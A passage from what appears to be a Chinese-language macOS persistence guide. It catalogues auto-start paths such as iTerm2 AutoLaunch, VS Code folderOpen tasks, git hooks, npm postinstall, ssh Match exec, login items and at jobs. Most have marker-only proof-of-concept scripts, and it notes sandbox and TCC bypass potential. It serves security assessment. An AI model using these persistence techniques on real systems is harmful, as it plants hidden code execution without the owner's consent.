[当前 iTerm2 Python API 指南](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts)介绍了在 `~/Library/Application Support/iTerm2/Scripts/AutoLaunch` 中自动运行 **Python** 脚本。它并未说明该文件夹中的任意可执行 `.sh` 文件都会运行。对于一次性测试账户，将以下内容保存为 `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`：

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

[当前的 iTerm2 AppleScript 指南](https://iterm2.com/documentation-scripting.html)单独介绍了 `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`；如果现代目录不存在，则会回退到旧版 `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt`。仅包含标记的 AppleScript 如下：

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

这些脚本示例根据 iTerm2 文档进行了检查，并未在活动桌面会话中运行。在一次性账户中测试后，请分别删除测试脚本和 `/tmp/ht-iterm-autolaunch-marker` 或 `/tmp/iterm2-autolaunchscpt`。

位于 **`~/Library/Preferences/com.googlecode.iterm2.plist`** 的 iTerm2 偏好设置可以指定 profile command 或初始文本。后者会输入到会话中；是否执行取决于 shell 是否对其进行解释。[iTerm2 的 profile 文档](https://iterm2.com/documentation-preferences-profiles-general.html)介绍了创建该 profile 的新会话时运行的命令。

可以在 iTerm2 设置中配置此项：

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

相应命令也会反映在偏好设置中：

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

为了进行安全评估，请在 iTerm2 设置中检查选定的配置文件，或读取其偏好设置文件的副本。更改正在使用的配置文件中的 `Initial Text` 会影响用户的会话，因此没有在研究用 Mac 上更改任何偏好设置。

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 但必须已安装 xbar
- TCC bypass：[✅](https://emojipedia.org/check-mark-button)
  - 它会请求 Accessibility 权限

#### 位置

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **`Trigger`**：xbar 启动后

#### 描述

如果安装了广受欢迎的程序 [**xbar**](https://github.com/matryer/xbar)，就可以在 **`~/Library/Application\ Support/xbar/plugins/`** 中编写 shell 脚本，该脚本会在 xbar 启动时执行：<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 但必须安装 Hammerspoon
- TCC bypass：[✅](https://emojipedia.org/check-mark-button)
  - 它会请求 Accessibility 权限

#### 位置

- **`~/.hammerspoon/init.lua`**
  - **触发条件**：执行 hammerspoon 时

#### 描述

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) 是一个用于 **macOS** 的自动化平台，使用 **LUA 脚本语言**执行操作。值得注意的是，它支持集成完整的 AppleScript 代码以及执行 shell 脚本，显著增强了其脚本功能。<sup>[[13]](#references)</sup>

该应用会查找单个文件 `~/.hammerspoon/init.lua`，启动时会执行其中的脚本。

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- 有助于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 但必须安装 BetterTouchTool
- TCC 绕过：[✅](https://emojipedia.org/check-mark-button)
  - 它会请求 Automation-Shortcuts 和 Accessibility 权限

#### 位置

- 已启用的 BetterTouchTool 预设**已引用**的脚本文件，或该预设在 `~/Library/Application Support/BetterTouchTool/` 下的配置。具体脚本路径取决于预设的配置方式。

[BetterTouchTool 的操作参考](https://docs.folivora.ai/docs/actions/action-definitions/)介绍了 shell-script 和 background-command 操作。相关预设处于活动状态时，必须触发配置好的键盘、鼠标、触控、widget 或其他事件；[其触发器指南](https://docs.folivora.ai/docs/configuration/new-trigger/)展示了这种对应关系。应用程序支持目录中的随机文件并不会触发执行。已配置且会加载外部可写脚本的操作，是范围更窄的写入到执行目标。代码以 BetterTouchTool 用户的账户运行，并受其实际 macOS 权限限制。研究用 Mac 的 `/Applications` 中没有 BetterTouchTool，因此本地未更改或执行任何预设。

### Alfred

- 有助于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 但必须安装 Alfred
- TCC 绕过：[✅](https://emojipedia.org/check-mark-button)
  - 它会请求 Automation、Accessibility，甚至 Full-Disk access 权限

#### 位置

- 已安装的 Alfred workflow **已引用**的脚本或文件，或用户在配置的 `Alfred.alfredpreferences` 目录中的该 workflow。偏好设置目录可能会同步，并非固定的通用路径。

[Alfred 的 workflow 指南](https://www.alfredapp.com/help/workflows/)介绍了 Powerpack 的前提要求，以及通过其 UI 安装 workflow 的方法。已安装 workflow 的 hotkey、keyword 或其他已配置触发器必须触发；[Alfred 的 hotkey 示例](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/)演示了 script action。[Alfred 的环境变量参考](https://www.alfredapp.com/help/workflows/script-environment-variables/)通过 `alfred_preferences` 提供所选偏好设置路径。将未注册的 workflow 文件放入任意目录，并不能证明它会被安装或运行。代码以已登录的 Alfred 用户身份运行，并受其实际 macOS 权限限制。研究用 Mac 的 `/Applications` 中没有 Alfred，因此这里只根据文档评估了这条路径。

### Raycast Script Commands 和 extension 刷新

- **写入目标：**位于已在 Raycast Settings → Script Commands 中**添加**的目录下的可执行脚本。Raycast 不会扫描任意新建的目录。[Raycast 的 Script Commands 指南](https://manual.raycast.com/script-commands)介绍了目录注册。
- **触发器和身份：**用户调用已索引的命令、已配置的 hotkey 或 fallback 调用该命令，或 Raycast 按配置的 `@raycast.refreshTime` 刷新 `inline` 脚本。脚本通过其解释器以已登录的 Raycast 用户身份运行。[上游 metadata 参考](https://github.com/raycast/script-commands#metadata)规定，自动刷新仅适用于 inline 命令；[Raycast 的 extension manifest](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md)则为已安装的 `no-view` 或 `menu-bar` extension 命令单独支持 `interval`。仅仅添加普通 script command 并不会为其安排定时执行。

对于已注册脚本目录的临时账户，标记文件专用的 inline 脚本如下：

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

将其保存到已注册的目录中，设为可执行文件，并让 Raycast 刷新。然后删除该文件和 `/tmp/ht-raycast-refresh-marker`。研究用 Mac 上未在通常的 `/Applications` 路径下找到 Raycast，因此这项操作有文档依据，但未在本地运行。辅助功能、自动化和文件访问授权仍取决于 macOS 的权限提示。

### Visual Studio Code 自动工作区任务

- **写入目标：** 用户将要打开的工作区内的 `.vscode/tasks.json`。
- **触发条件：** 在 VS Code 中打开该工作区，但前提是该文件夹受信任**且**已允许自动任务。不受信任的工作区绝不会运行自动任务；默认设置会在首次自动运行前提示用户。[VS Code task documentation](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) 和 [Workspace Trust documentation](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) 说明了这两个条件。
- **执行身份：** VS Code 用户的账户，通过已配置的任务进程执行。这是应用级执行，而非登录持久化。

在一个**新的、一次性工作区**中，将以下仅用于标记的任务放入 `.vscode/tasks.json`：

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

打开受信任的工作区并允许自动任务运行后，检查 `.autostart-task-ran`。移除任务条目和标记以完成清理。**已根据 Microsoft 文档和已安装的 VS Code 1.139.1 bundle 进行验证；未在当前桌面会话中运行。**

### Chrome native messaging hosts

- **写入目标：** 当前用户为 `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json`，所有用户为 `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json`（需要管理员写入权限）。Chromium 和 Chrome for Testing 使用不同目录；请参阅 [Chrome 的当前路径表](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location)。
- **触发方式：** 已安装的 Chrome 扩展需具有 `nativeMessaging` 权限，并使用 manifest 中完全匹配的主机名称调用 `chrome.runtime.connectNative()` 或 `chrome.runtime.sendNativeMessage()`。随后 Chrome 会启动主机可执行文件。仅打开 Chrome 不会执行任意新 native host；如果没有调用它的扩展，创建 manifest 不会产生任何效果。[Chrome 的 native messaging 指南](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging)说明了此握手过程。
- **执行身份：** Chrome 用户的账户。manifest 必须指定可执行文件的绝对路径，并明确允许调用方扩展的来源。

在一个装有测试扩展的临时浏览器账户中，以下这对文件展示了从写入到执行的关联。manifest 的文件名必须与其 `name` 相符，并且必须将 `TEST_EXTENSION_ID` 替换为该扩展的实际 ID：

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

将此 JSON 保存为 `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`。manifest 中 `path` 指向的仅包含 marker 的可执行文件可以包含：

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

测试扩展从其 service worker 或扩展页面调用 `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` 后，marker 可证明 host 已启动。这个最小 host 未实现 Chrome 的长度前缀响应协议，因此写入 marker 后，扩展可能会报告消息传递错误。清理时请删除测试 manifest、host 和 marker。在 macOS 26.5.2 上，Chrome 应用和两个 manifest 目录均存在；**未修改或使用活动的 Chrome 配置文件**。

### Karabiner-Elements 按键事件命令

- **写入目标：**在已安装并运行 Karabiner-Elements 的账户中，写入 `~/.config/karabiner/karabiner.json`。[Karabiner 的文件位置指南](https://karabiner-elements.pqrs.org/docs/json/location/)说明应用会监视此文件，并在写入后重新加载。`assets/complex_modifications` 中的 JSON 文件只是可导入的预设；仅将文件写入该目录不会启用规则。
- **触发条件：**规则生效后，触发配置的按键事件。[`to.shell_command` 参考文档](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/)介绍了命令执行。这不会在登录时或每次文件写入时执行代码。
- **执行身份：**运行 Karabiner 用户进程的已登录用户。该进程自身的权限授权和 TCC 访问权限取决于应用及其版本。

在一次性测试账户中，将此规则对象添加到 `karabiner.json` 所选配置文件的 `complex_modifications.rules` 数组中，并保留该配置文件的其余内容。按 F18 创建一个无害的 marker，然后删除此规则和 marker。选择 F18 可避免替换普通打字键：

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements 未安装在 macOS 26.5.2 测试机器的 `/Applications` 中，因此这是一个基于文档的 PoC，而非本地运行结果。

### 本地仓库中的 Git hooks

- **写入目标：** 可执行 hook，例如 `<repo>/.git/hooks/post-checkout`。如果已设置 `core.hooksPath`，则使用该配置目录。作为普通跟踪源文件提交的 hook 不会自动安装到 clone 中。
- **触发条件：** 对应的 Git 操作。例如，`post-checkout` 会在 `git checkout` 或 `git switch` 后运行，也可能在 clone 或创建 worktree 后运行。[Git 的 hook 参考文档](https://git-scm.com/docs/githooks)列出了相关事件和可执行位要求；[`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) 会更改查找目录。
- **执行身份：** 运行 Git 的账户。只有当仓库的有效 hooks 目录对执行者可写，且用户随后执行相关 Git 操作时，hook 才能运行。

这个仅创建标记的 PoC 会创建一个完全可丢弃的仓库、安装一个 hook，并切换分支。它已在 macOS 26.5.2 上使用 Apple Git 2.50.1 成功执行：

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### 项目中的 npm lifecycle scripts

- **写入目标：**可写项目的 `package.json` 中的 `scripts` 映射，或用户将运行其 lifecycle script 的已安装依赖包。这是开发工作流钩子，不会因打开目录而执行。
- **触发条件与身份：**之后运行 `npm install` 或 `npm ci` 时，如果允许 lifecycle scripts，就会以调用 npm 的用户身份运行 `preinstall`、`install` 和 `postinstall`。普通的 `npm run <name>` 也会运行匹配的 `pre<name>` 和 `post<name>` scripts。[npm 的 lifecycle 参考文档](https://docs.npmjs.com/cli/v11/using-npm/scripts)列出了这些事件；[`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) 可禁止 install lifecycle scripts。版本和策略设置可能会改变允许执行的内容，因此请检查目标 npm 版本。

这个仅写入标记的 PoC 使用本地 npm 在一个临时的空目录中运行。它不会下载依赖，也不会更改用户的项目：

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

这与 Python 解释器启动文件不同：npm 必须执行相关的安装或运行操作，而 Python `site` 代码可在普通的解释器调用时加载。通用 `Makefile` 目标和构建任务定义同样需要用户或已配置的工具调用相应目标；它们不是独立的 OS 自动启动路径。

### Vim 启动配置

- **写入目标：**将 `~/.vimrc` 写入将要启动 Vim 的用户账户（或 Vim 初始化顺序中选定的其他启动文件）。[Vim 的启动参考文档](https://vimhelp.org/starting.txt.html)介绍了该文件以及 `VIMINIT`/`EXINIT` 覆盖项。
- **触发条件：**后续普通启动 Vim 时加载此配置。Vim 的 `-u NONE` 选项会跳过用户 vimrc。这是编辑器特定的执行方式，不是 OS 登录触发器。
- **执行身份：**Vim 用户的账户。

以下隔离 PoC 在 macOS 的 `/usr/bin/vim` 上运行；不会写入任何实际的 Vim 首选项或打开的文档：

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim 有独立的用户配置路径 `$XDG_CONFIG_HOME/nvim/init.lua` 或 `init.vim`，并且会根据其[启动文档](https://neovim.io/doc/user/starting/)加载 `plugin/` runtime 目录中的脚本。macOS 26.5.2 测试机器上未安装 Neovim，因此未在该机器上运行此变体。

### SSH 客户端配置命令

- **写入目标：** `~/.ssh/config`，或该文件已包含的其他文件。这是**客户端**配置文件，与下文所述服务器端的 `~/.ssh/rc` 不同。
- **触发条件：** 匹配的 `ssh` 调用。客户端评估配置时，`Match exec` 会运行本地命令，即使是只打印配置而不连接的 `ssh -G` 也会运行。客户端设置匹配连接时会运行 `ProxyCommand`。只有在成功连接后才会运行 `LocalCommand`，且需要设置 `PermitLocalCommand yes`（默认值为 `no`）。这些命令的运行时机和前置条件各不相同；仅写入配置并不会执行它们。参见上游 [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5)。
- **执行身份：** 运行 `ssh` 的本地用户。必须匹配主机、适用的配置文件，并满足任何所需的连接条件。`ssh -F` 可以指定其他配置文件。

此仅写入标记的 PoC 使用 macOS 26.5.2 上 Apple 的 SSH 客户端运行。`-G` 会触发 `Match exec`，但不会建立网络连接，也不会读取用户实际的 SSH 配置：

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### 调试器初始化文件

- **写入目标：** `~/.lldbinit`，或优先级更高的应用专用文件，例如 `~/.lldbinit-lldb`。LLDB 会在调试器启动时读取其中一个文件。默认情况下，不会执行当前目录中的 `.lldbinit`；用户必须启用 `target.load-cwd-lldbinit` 或传入 `--local-lldbinit`。参见 [LLDB 手册](https://lldb.llvm.org/man/lldb.html)。
- **触发条件和身份：** 用户启动 LLDB 时未指定 `--no-lldbinit`；命令以该用户的身份运行。仅仅打开项目并不意味着会执行项目中的 `.lldbinit`。

以下仅使用标记的测试在 macOS 26.5.2 上的 LLDB 中运行，使用了隔离的主目录和工作目录：

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

For **GDB**，其[上游启动文档](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html)列出了 macOS 上的 `$HOME/Library/Preferences/gdb/gdbinit`，然后是 `~/.gdbinit`。当前目录中的 `.gdbinit` 受[自动加载安全路径](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html)限制，而 `-nx`/`-nh` 会禁用初始化文件。测试用的 Mac 未安装 GDB，因此未在本地运行此变体。

### SSHRC

说明：[https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 但需要启用并使用 ssh
- TCC bypass：[✅](https://emojipedia.org/check-mark-button)
  - SSH 使用需要有 FDA 访问权限

#### 位置

- **`~/.ssh/rc`**
  - **触发条件**：通过 ssh 登录
- **`/etc/ssh/sshrc`**
  - 需要 root 权限
  - **触发条件**：通过 ssh 登录

> [!CAUTION]
> 开启 ssh 需要 Full Disk Access：
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### 描述与利用

默认情况下，除非在 `/etc/ssh/sshd_config` 中设置 `PermitUserRC no`，否则用户**通过 SSH 登录时**，会执行脚本 **`/etc/ssh/sshrc`** 和 **`~/.ssh/rc`**。<sup>[[14]](#references)</sup>

### **登录项**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 但你需要带参数执行 `osascript`
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- **已注册的登录项辅助应用：** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app`（常见的捆绑位置）。
  - **触发方式：**注册时可能会立即启动辅助应用；之后用户再次登录时也会启动，但需获得批准。
- **已注册的捆绑 agent/daemon：**`<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` 或 `Contents/Library/LaunchDaemons/<name>.plist`。
  - **触发方式：**获批的 agent 可能在注册时启动，也会在之后用户登录时启动；获批的 daemon 则会在启动时运行。daemon 需要管理员批准。

#### 描述

用户可以在 **系统设置 → 通用 → 登录项与扩展** 中查看登录项和后台项。macOS 13 及更高版本提供 [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice)，用于注册捆绑的登录项、launch agent 和 launch daemon。其 [`register()` 的行为](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29)会因类型和批准状态而异。**仅将辅助应用写入 app bundle 并不足以注册新的登录项。**反过来，如果已注册的辅助应用可执行文件可写，修改该文件可能会影响其下次启动，无需重新注册；请先确认实际路径和代码签名检查。

以下方法只读，可用于查找 Mac 上的捆绑辅助应用；它不会注册或启动其中任何一项：

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

对于捆绑的 launch plist，应将 `BundleProgram` **相对于应用程序包根目录**解析（例如 `Contents/MacOS/Helper`），如[Apple 的 Service Management 迁移指南](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos)所述。在研究用 Mac 上对 `/Applications` 进行只读盘点，发现 14 个捆绑的 helper 条目和五个 `BundleProgram` 声明；五个目标均成功解析，其中两个通过了用户可写性检查。该检查**不能**证明任一 helper 已注册、已启用、通过签名验证后仍可执行，或可被沙箱访问。此 Mac 上，`sfltool dumpbtm` 列出了 150 条命名记录；它是检查工具，并不能证明每条记录都在运行。

较旧的登录项也可以通过 Apple events 管理。可以从命令行列出、添加和移除它们，但添加操作会更改用户持久化的登录配置，且可能需要获得 Automation 批准：<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` 是实现细节，并非受支持的 payload 安装位置，不能仅通过写入文件来安装。较旧的 `SMLoginItemSetEnabled` API 已被 `SMAppService` 取代，用于注册新的 helper；页面之前提到的 `/var/db/com.apple.xpc.launchd/loginitems.501.plist` 路径在 macOS 26.5.2 测试机器上不存在。评估现代登录项时，应使用注册 API 和系统 UI 状态，而不是假定某个数据库路径存在。

### ZIP 作为登录项

（请参阅前一节关于登录项的内容；这是该部分的扩展）

如果将 **ZIP** 文件设为**登录项**，**`Archive Utility`** 会打开它。如果该 ZIP 例如存放在 `~/Library` 中，且包含带后门的文件夹 **`LaunchAgents/file.plist`**，系统就会创建该文件夹（默认情况下它不存在）并添加 plist。这样，用户下次登录时，**plist 中指定的后门就会执行**。

另一种做法是在用户 HOME 目录中创建 **`.bash_profile`** 和 **`.zshenv`** 文件，这样即使 LaunchAgents 文件夹已经存在，这种技术仍然有效。

### At

Writeup：[https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 但你需要**执行** **`at`**，而且它必须处于**启用状态**
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- 需要**执行** **`at`**，而且它必须处于**启用状态**

#### **描述**

`at` 任务用于**安排在特定时间执行一次性任务**。与 cron jobs 不同，`at` 任务在执行后会自动删除。需要注意的是，这些任务在系统重启后仍会保留，因此在某些情况下可能带来安全风险。<sup>[[16]](#references)</sup>

捆绑的 `com.apple.atrun.plist` 中设有 `Disabled = true`，但 launchd 会将实际生效的启用/禁用覆盖状态单独保存。在 macOS 26.5.2 测试机器上，`launchctl print-disabled system` 报告 `com.apple.atrun` 为**已启用**，尽管捆绑文件中有该设置。声称 `at` jobs 会运行之前，请检查其实际生效状态：

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

管理员可以使用 `launchctl` 启用已禁用的 `atrun` 服务；以下历史示例会更改系统服务状态，且**未**在研究用 Mac 上运行：

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

这将在 1 小时后创建一个文件：

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

使用 `atq:` 检查作业队列：

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

上面可以看到有两个已计划的作业。我们可以使用 `at -c JOBNUMBER` 打印作业的详细信息。

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> 如果未启用 AT tasks，创建的任务将不会执行。

**作业文件**位于 `/private/var/at/jobs/`。

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

文件名包含队列、作业编号以及计划运行的时间。以 `a0001a019bdcd2` 为例：

- `a` - 队列
- `0001a` - 十六进制作业编号，`0x1a = 26`
- `019bdcd2` - 十六进制时间，表示自 epoch 起经过的分钟数。`0x019bdcd2` 转换为十进制是 `26991826`。乘以 60 后得到 `1619509560`，即 `GMT: 2021. April 27., Tuesday 7:46:00`。

打印作业文件后，可以发现其中包含的信息与使用 `at -c` 得到的信息相同。

### Calendar 打开文件提醒

- **写入目标：** Calendar 事件的自定义 **打开文件**提醒中**已选定**的可执行 app bundle 或其他文件。创建或编辑提醒本身需要通过 Calendar 或已获授权的日历数据源访问相应日历事件；随意写入某个文件并不会创建提醒。
- **触发条件：** 在 Calendar 处理该事件的 Mac 上，到达提醒的预定时间。重复事件可以重复执行此操作。[Apple 当前的 Calendar 指南](https://support.apple.com/guide/calendar/icl1012/mac)确认 macOS 26 中存在 **自定 → 打开文件**提醒选项。
- **执行身份与限制：** Calendar 会通过关联的应用，以已登录用户的身份打开所选文件。启动 app bundle 可能会以该用户身份执行其代码，但会受到 Gatekeeper、quarantine 和其他 macOS 检查的限制。普通脚本文件可能只会在编辑器中打开；仅凭文件扩展名不能证明代码会执行。

要安全评估候选目标，请在 Calendar 中检查事件提醒，并检查所选文件的权限。此路径依据 Apple 指南记录，**未**在研究用 Mac 上运行，因为测试会修改正在使用的日历，并需要等待桌面事件触发。在一次性账户中，可以选择一个仅用于创建标记的 app bundle，设置一个近期的打开文件提醒，确认应用启动，然后删除事件和应用。

### macOS 上的 Shortcuts 自动化

- **写入目标：** 已被快捷指令操作**引用**的可执行文件，或授权用户可以编辑的现有快捷指令。随机的 `.shortcut` 文件，或写入未公开的 Shortcuts 数据库，都不是受支持的自动化注册方式。
- **触发条件与身份：** 先前配置并启用的自动化事件（例如一天中的某个时间或某个应用事件）会以已登录用户的身份调用快捷指令。[Apple 当前的 Mac 自动化指南](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac)列出了支持的事件，说明自动化何时可以在无需询问的情况下运行，并介绍了如何移除触发条件。[Apple 的 Shortcuts 隐私指南](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac)要求脚本操作启用 **允许运行脚本**，而各个操作仍可能请求权限。

这是一种有条件的写入到执行路径，**仅当现有操作会加载可写目标时才成立**。通过 UI 创建新的自动化会修改当前设置，因此未在研究用 Mac 上尝试。在一次性账户中，所有者可以配置一个包含脚本的一天中某个时间快捷指令，让脚本创建 `/tmp/ht-shortcuts-marker`，启用所需权限，在事件触发后确认标记，然后删除自动化、快捷指令和标记。

### Automator 操作与 Quick Actions

- **写入目标：** `~/Library/Automator/*.action`（用户）和 `/Library/Automator/*.action`（管理员）中的 action bundle。已保存的 Quick Action workflow 通常保存在 `~/Library/Services/*.workflow`；请检查用户所选 workflow 的实际路径。[Apple 的 Automator framework 参考](https://developer.apple.com/documentation/automator)列出了 action 搜索目录。
- **触发条件：** Automator 运行时会加载可用的 action bundle，但只有在使用该 action 的 workflow 执行时，action 的任务才会运行。用户从 Finder、Services 或其他显示的菜单中选择 Quick Action 时，该操作就会运行。当项目被添加到其**已关联**的文件夹时，Folder Action workflow 会运行；Calendar Alarm workflow 则会在事件时间运行。[Apple 的 workflow 类型说明](https://support.apple.com/guide/automator/aut7cac58839/mac)区分了这些事件。仅仅写入 action 或 workflow 并不会关联文件夹或安排日历事件。
- **执行身份与限制：** 运行 workflow 的账户；Automator 或调用应用必须加载 action，并且当前的代码签名或隐私检查必须允许执行。已被活动 workflow 引用的可写 action bundle，与安装一个新 action 后等待用户选择，是不同的情况。

macOS 26.5.2 测试 Mac 上存在用户的 `Automator` 和 `Services` 目录；`/Library/Automator` 不存在。没有创建、关联或执行任何实际 workflow。请使用一次性账户和仅用于创建标记的 action/workflow 来确认特定的加载路径。单独的 [Folder Actions](#folder-actions) 部分会更详细地介绍该事件来源。

